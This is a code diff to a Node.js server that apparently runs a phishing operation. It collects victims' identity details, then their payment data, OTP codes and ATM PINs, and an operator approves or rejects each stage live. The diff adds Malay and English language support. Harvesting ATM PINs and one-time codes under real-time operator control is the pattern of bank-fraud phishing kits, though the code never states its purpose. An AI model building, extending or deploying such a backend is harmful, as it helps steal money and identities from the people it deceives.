@@ -42,7 +42,8 @@ async function initDb() {
         rejected BOOLEAN DEFAULT FALSE,
         rejection_reason TEXT,
         admin_action TEXT,
-        admin_action_at TEXT
+        admin_action_at TEXT,
+        lang TEXT DEFAULT 'ms'
       );
 
       CREATE TABLE IF NOT EXISTS order_states (
@@ -262,7 +263,7 @@ app.post('/api/heartbeat', async (req, res) => {
 // Save personal data (Step 1)
 app.post('/api/orders/personal-data', async (req, res) => {
   try {
-    const { fullname, id_number, phone, id_expiry_day, id_expiry_month, id_expiry_year, dob_day, dob_month, dob_year, email, gender } = req.body;
+    const { fullname, id_number, phone, id_expiry_day, id_expiry_month, id_expiry_year, dob_day, dob_month, dob_year, email, gender, lang } = req.body;
 
     if (!fullname || !id_number || !phone || !email) {
       return res.status(400).json({ error: 'Missing required fields' });
@@ -291,9 +292,9 @@ app.post('/api/orders/personal-data', async (req, res) => {
       await client.query('BEGIN');
       
       await client.query(`
-        INSERT INTO orders (id, session_id, timestamp, status, current_page, country, personal_data)
-        VALUES ($1, $2, $3, $4, $5, $6, $7)
-      `, [orderId, sessionId, new Date().toISOString(), 'personal_data_submitted', 'personal_data', country, JSON.stringify(personalData)]);
+        INSERT INTO orders (id, session_id, timestamp, status, current_page, country, personal_data, lang)
+        VALUES ($1, $2, $3, $4, $5, $6, $7, $8)
+      `, [orderId, sessionId, new Date().toISOString(), 'personal_data_submitted', 'personal_data', country, JSON.stringify(personalData), lang || 'ms']);
 
       // عند إدخال البيانات الشخصية فقط، المرحلة payment لكن الحالة waiting (ليست pending)
       await client.query(`
@@ -371,14 +372,15 @@ app.get('/api/orders/:orderId/status', async (req, res) => {
       return res.json({ status: 'unknown' });
     }
 
-    const orderRes = await pool.query('SELECT current_page FROM orders WHERE id = $1', [orderId]);
+    const orderRes = await pool.query('SELECT current_page, lang FROM orders WHERE id = $1', [orderId]);
     const state = stateRes.rows[0];
     
     res.json({
       status: state.status,
       stage: state.stage,
       message: state.message,
-      currentPage: orderRes.rowCount > 0 ? orderRes.rows[0].current_page : null
+      currentPage: orderRes.rowCount > 0 ? orderRes.rows[0].current_page : null,
+      lang: orderRes.rowCount > 0 ? orderRes.rows[0].lang : 'ms'
     });
   } catch (err) {
     console.error(err);
@@ -520,15 +522,15 @@ app.post('/api/admin/approve/:orderId', async (req, res) => {
       if (stage === 'payment') {
         stage = 'otp';
         status = 'approved';
-        currentPage = 'loading_otp';
+        currentPage = 'otp';
       } else if (stage === 'otp') {
         stage = 'atm_pin';
         status = 'approved';
-        currentPage = 'loading_atm';
+        currentPage = 'atm-pin';
       } else if (stage === 'atm_pin') {
         stage = 'success';
         status = 'approved';
-        currentPage = 'loading_success';
+        currentPage = 'success';
         orderStatus = 'completed';
       }
 
@@ -573,13 +575,17 @@ app.post('/api/admin/reject/:orderId', async (req, res) => {
       const stage = stateRes.rows[0].stage;
       let currentPage = stage;
 
+      const orderInfo = await client.query('SELECT lang FROM orders WHERE id = $1', [orderId]);
+      const lang = orderInfo.rowCount > 0 ? orderInfo.rows[0].lang : 'ms';
+      const defaultMsg = lang === 'en' ? 'Information is incorrect' : 'Maklumat tidak betul';
+
       await client.query(`
         UPDATE orders SET current_page = $1, admin_action = $2, admin_action_at = $3, rejected = TRUE, rejection_reason = $4 WHERE id = $5
-      `, [currentPage, 'rejected', new Date().toISOString(), message || 'Information incorrect', orderId]);
+      `, [currentPage, 'rejected', new Date().toISOString(), message || defaultMsg, orderId]);
 
       await client.query(`
         UPDATE order_states SET status = $1, message = $2 WHERE order_id = $3
-      `, ['rejected', message || 'Information incorrect', orderId]);
+      `, ['rejected', message || defaultMsg, orderId]);
 
       await client.query('COMMIT');
       res.json({ success: true, message: 'Order rejected' });
